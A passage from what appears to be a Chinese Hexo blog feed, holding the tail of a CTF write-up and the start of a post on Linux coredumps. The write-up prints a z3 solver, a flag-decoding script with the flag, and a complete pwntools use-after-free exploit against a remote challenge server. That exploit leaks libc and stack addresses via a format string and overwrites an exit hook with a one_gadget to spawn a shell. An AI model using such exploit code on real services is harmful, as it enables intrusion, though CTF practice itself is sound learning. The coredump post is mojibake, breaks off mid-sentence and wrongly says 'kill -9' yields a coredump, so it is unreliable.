class="hljs-number">0x0000F68C</span>, <span class="hljs-number">0x0001192A</span>, <span class="hljs-number">0x000150AD</span>, <span class="hljs-number">0x0001B1A0</span>, <span class="hljs-number">0x00014C60</span>, <span class="hljs-number">0x000182AB</span>, <span class="hljs-number">0x00013F4B</span>, <span class="hljs-number">0x000141A6</span>, <span class="hljs-number">0x00015AA3</span>, <span class="hljs-number">0x000135C9</span>, <span class="hljs-number">0x0001D86F</span>, <span class="hljs-number">0x0001E8FA</span>, <span class="hljs-number">0x0002158D</span>, <span class="hljs-number">0x0002BDAC</span>, <span class="hljs-number">0x00020E4F</span>, <span class="hljs-number">0x00027EE6</span>, <span class="hljs-number">0x000213B9</span>, <span class="hljs-number">0x00020E86</span>, <span class="hljs-number">0x000211FF</span>, <span class="hljs-number">0x0001E1EF</span>]<br>cheng = [<span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000083</span>, <span class="hljs-number">0x000000FF</span>, <span class="hljs-number">0x000000E0</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x000000C5</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x000000F6</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000D9</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x0000006B</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x000000CA</span>, <span class="hljs-number">0x00000073</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x00000072</span>, <span class="hljs-number">0x00000024</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000049</span>, <span class="hljs-number">0x0000007E</span>, <span class="hljs-number">0x000000A9</span>, <span class="hljs-number">0x000000CE</span>, <span class="hljs-number">0x00000091</span>, <span class="hljs-number">0x000000BE</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000060</span>, <span class="hljs-number">0x0000003F</span>, <span class="hljs-number">0x0000002B</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x00000090</span>, <span class="hljs-number">0x000000E9</span>, <span class="hljs-number">0x0000008E</span>, <span class="hljs-number">0x000000BA</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x000000F3</span>, <span class="hljs-number">0x00000041</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000069</span>, <span class="hljs-number">0x000000DA</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000FD</span>, <span class="hljs-number">0x000000E7</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000036</span>, <span class="hljs-number">0x000000D6</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000059</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x00000087</span>, <span class="hljs-number">0x000000AF</span>, <span class="hljs-number">0x000000FB</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x00000044</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x000000AD</span>, <span class="hljs-number">0x000000F8</span>, <span class="hljs-number">0x0000002C</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x00000022</span>, <span class="hljs-number">0x00000084</span>, <span class="hljs-number">0x000000AC</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000023</span>, <span class="hljs-number">0x000000DC</span>, <span class="hljs-number">0x000000E6</span>, <span class="hljs-number">0x000000BB</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x000000B8</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x000000BC</span>, <span class="hljs-number">0x000000DE</span>, <span class="hljs-number">0x00000050</span>, <span class="hljs-number">0x0000009C</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x00000086</span>, <span class="hljs-number">0x0000003A</span>, <span class="hljs-number">0x0000002D</span>, <span class="hljs-number">0x000000DD</span>, <span class="hljs-number">0x000000C3</span>, <span class="hljs-number">0x00000003</span>]<br>tr1 = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    i = k<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        v9 = flag[m+n] * cheng[i]<br>        i += <span class="hljs-number">10</span><br>        v8 += v9<br>    s.add(a[k+n] == v8)<br>        <br><br><br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    <span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=[<span class="hljs-number">0</span>]*<span class="hljs-number">100</span><br>flag[<span class="hljs-number">5</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">6</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">0</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">9</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">2</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">7</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">8</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">1</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">3</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">4</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">15</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">11</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">14</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">19</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">17</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">18</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">16</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">10</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">13</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">12</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">20</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">27</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">25</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">28</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">26</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">29</span>]=<span class="hljs-number">109</span><br>flag[<span class="hljs-number">24</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">21</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">22</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">23</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">39</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">34</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">35</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">33</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">30</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">38</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">31</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">36</span>]=<span class="hljs-number">98</span><br>flag[<span class="hljs-number">32</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">37</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">40</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">48</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">45</span>]=<span class="hljs-number">79</span><br>flag[<span class="hljs-number">43</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">47</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">42</span>]=<span class="hljs-number">46</span><br>flag[<span class="hljs-number">44</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">46</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">41</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">49</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">54</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">57</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">58</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">55</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">56</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">59</span>]=<span class="hljs-number">55</span><br>flag[<span class="hljs-number">52</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">51</span>]=<span class="hljs-number">123</span><br>flag[<span class="hljs-number">50</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">53</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">66</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">64</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">62</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">68</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">63</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">60</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">65</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">69</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">61</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">67</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">76</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">78</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">72</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">75</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">73</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">79</span>]=<span class="hljs-number">100</span><br>flag[<span class="hljs-number">74</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">70</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">71</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">77</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">86</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">83</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">88</span>]=<span class="hljs-number">125</span><br>flag[<span class="hljs-number">87</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">80</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">84</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">85</span>]=<span class="hljs-number">53</span><br>flag[<span class="hljs-number">82</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">89</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">81</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">94</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">95</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">92</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">91</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">96</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">98</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">90</span>]=<span class="hljs-number">121</span><br>flag[<span class="hljs-number">93</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">99</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">97</span>]=<span class="hljs-number">95</span><br>flag1 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag1 += <span class="hljs-built_in">chr</span>(flag[i])<br>    <br><span class="hljs-built_in">print</span>(flag1)<br><br><span class="hljs-comment">#there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>banary = <span class="hljs-string">&quot;./main&quot;</span><br>elf = ELF(banary)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>ip = <span class="hljs-string">&#x27;120.78.209.16&#x27;</span><br>port = <span class="hljs-number">48803</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>    io = process(banary)<br><span class="hljs-keyword">else</span>:<br>    io = remote(ip, port)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : io.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : io.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : io.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : io.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : io.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : io.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(io.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>iuu32 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br>iuu64 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>)<br>uheap = <span class="hljs-keyword">lambda</span> : u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> data : io.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="hljs-built_in">eval</span>(data)))<br>ia = <span class="hljs-keyword">lambda</span> : io.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;size: \n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Passwd: \n&#x27;</span>, <span class="hljs-string">b&#x27;1234567890\x00&#x27;</span>)<br><br><br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#Index 0</span><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#index 1</span><br>free(<span class="hljs-number">0</span>)<br>show()<br>libc_base = uu64() - <span class="hljs-number">0x1ebbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ogg = libc_base + <span class="hljs-number">0xe6c7e</span><br><br><span class="hljs-comment">#debug(&#x27;b *$rebase(0x1429)&#x27;)</span><br><br>ad()<br>sa(<span class="hljs-string">b&#x27;name: \n&#x27;</span>, <span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>ret_addr = stack - <span class="hljs-number">0x18</span><br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>)<br><br>exit_hook = libc_base + <span class="hljs-number">0x222060</span> + <span class="hljs-number">3848</span><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;WRITE MODE: \n&#x27;</span>, p64(exit_hook))<br>sleep(<span class="hljs-number">1</span>)<br>s(p64(ogg))<br><span class="hljs-comment">#pause()</span><br><br>ia()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è“å¸½æ¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†coredump</title>
    <link href="/2023/08/21/coredump/"/>
    <url>/2023/08/21/coredump/</url>
    
    <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>ä»Šå¤©åœ¨åˆ†æTBOXçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ª<code>CoredumpService</code>çš„æœåŠ¡ï¼Œå…·ä½“ä»£ç æ¶‰åŠä¿å¯†ï¼Œå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œfwçš„æˆ‘ä¹‹å‰å¹¶ä¸çŸ¥é“coredumpæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæ‰€ä»¥æ¥å­¦ä¹ è®°å½•ä¸€ä¸‹ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯coredump"><a href="#ä»€ä¹ˆæ˜¯coredump" class="headerlink" title="ä»€ä¹ˆæ˜¯coredump"></a>ä»€ä¹ˆæ˜¯coredump</h3><p>coredumpé¡¾åæ€ä¹‰å°±æ˜¯æ ¸å¿ƒè½¬å‚¨ã€‚æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‘ç”Ÿäº†å¼‚å¸¸crashï¼Œå…‰é ç¨‹åºè‡ªèº«çš„logæ˜¯å¾ˆéš¾å®šä½åˆ°æ ¹å› çš„ï¼Œæ‰€ä»¥æ“ä½œç³»ç»Ÿæä¾›äº†ä¸€å¥—coredumpæœºåˆ¶ã€‚è¿™å¥—æœºåˆ¶å¯ä»¥åœ¨crashå‘ç”Ÿçš„æ—¶å€™ï¼ŒæŠŠè¿›ç¨‹ç°åœºçš„vmaä¿¡æ¯å­˜å‚¨åˆ°coredumpæ–‡ä»¶ä¸­å»ã€‚åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå°±å¯ä»¥æ¢å¤å¼‚å¸¸ç°åœºçš„ä¿¡æ¯ï¼Œåˆ†æäººå‘˜å¯ä»¥ä»ä¸­è·å–åˆ°<strong>å˜é‡å€¼ã€æ ˆä¿¡æ¯ã€å†…å­˜æ•°æ®ã€ç¨‹åºcrashæ—¶çš„è¿è¡Œä½ç½®ç­‰</strong>ã€‚</p><h3 id="coredumpæ˜¯å¦‚ä½•ç”Ÿæˆçš„"><a href="#coredumpæ˜¯å¦‚ä½•ç”Ÿæˆçš„" class="headerlink" title="coredumpæ˜¯å¦‚ä½•ç”Ÿæˆçš„"></a>coredumpæ˜¯å¦‚ä½•ç”Ÿæˆçš„</h3><p><img src="/mdimg/Linux/coredump1.png"></p><p>å½“åº”ç”¨ç¨‹åºå‘ç”Ÿcrashæ—¶ï¼Œä¼šé™·å…¥åˆ°å†…æ ¸è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œæ­¤æ—¶å†…æ ¸ä¼šäº§ç”Ÿä¸€ä¸ªä¿¡å·(signal)å‘é€ç»™å¯¹åº”çš„è¿›ç¨‹ã€‚å½“è¿›ç¨‹ä»å†…æ ¸æ€åˆ°ç”¨æˆ·æ€åˆ‡æ¢æ—¶ï¼Œè¯¥è¿›ç¨‹ä¼šå¤„ç†è¿™ä¸ªä¿¡å·ã€‚æ­¤ç±»ä¿¡å·ï¼ˆæ¯”å¦‚SEGVï¼‰çš„é»˜è®¤å¤„ç†è¡Œä¸ºå°±ä¼šç”Ÿæˆä¸€ä¸ªcoredumpæ–‡ä»¶ã€‚å½“ç„¶ï¼Œæ‰‹åŠ¨ç»™æŸä¸ªåº”ç”¨ç¨‹åºå‘é€è¿™ç±»ä¿¡å·ï¼Œä¹Ÿæ˜¯å¯ä»¥ç”Ÿæˆå¯¹åº”çš„coredumpæ–‡ä»¶çš„ï¼Œä¾‹å¦‚<code>kill -9 pidof xxx</code></p><h4 id="å“ªäº›ä¿¡å·å¯ä»¥äº§ç”Ÿcoredumpæ–‡ä»¶"><a href="#å“ªäº›ä¿¡å·å¯ä»¥äº§ç”Ÿcoredumpæ–‡ä»¶" class="headerlink" title="å“ªäº›ä¿¡å·å¯ä»¥äº§ç”Ÿcoredumpæ–‡ä»¶"></a>å“ªäº›ä¿¡å·å¯ä»¥äº§ç”Ÿcoredumpæ–‡ä»¶</h4><p><img src="/mdimg/Linux/coredump2.png"></p><p>å¯ä»¥çœ‹åˆ°3ã€4ã€6ã€8ã€11éƒ½èƒ½äº§ç”Ÿçš„ä¿¡å·ï¼Œ é»˜è®¤éƒ½ä¼šäº§ç”Ÿcoredumpè¡Œä¸ºã€‚å¦‚æœä¿®æ”¹äº†è¿›ç¨‹å¯¹è¿™ç±»ä¿¡å·çš„å¤„ç†ï¼Œåˆ™ä¸ä¼šäº§ç”Ÿcoredumpäº†ã€‚</p><h4 id="ä¿å­˜çš„coredumpæ–‡ä»¶åœ¨ä»€ä¹ˆåœ°æ–¹"><a href="#ä¿å­˜çš„coredumpæ–‡ä»¶åœ¨ä»€ä¹ˆåœ°æ–¹" class="headerlink" title="ä¿å­˜çš„coredumpæ–‡ä»¶åœ¨ä»€ä¹ˆåœ°æ–¹"></a>ä¿å­˜çš„coredumpæ–‡ä»¶åœ¨ä»€ä¹ˆåœ°æ–¹</h4><p><code>/proc/sys/kernel/core_pattern 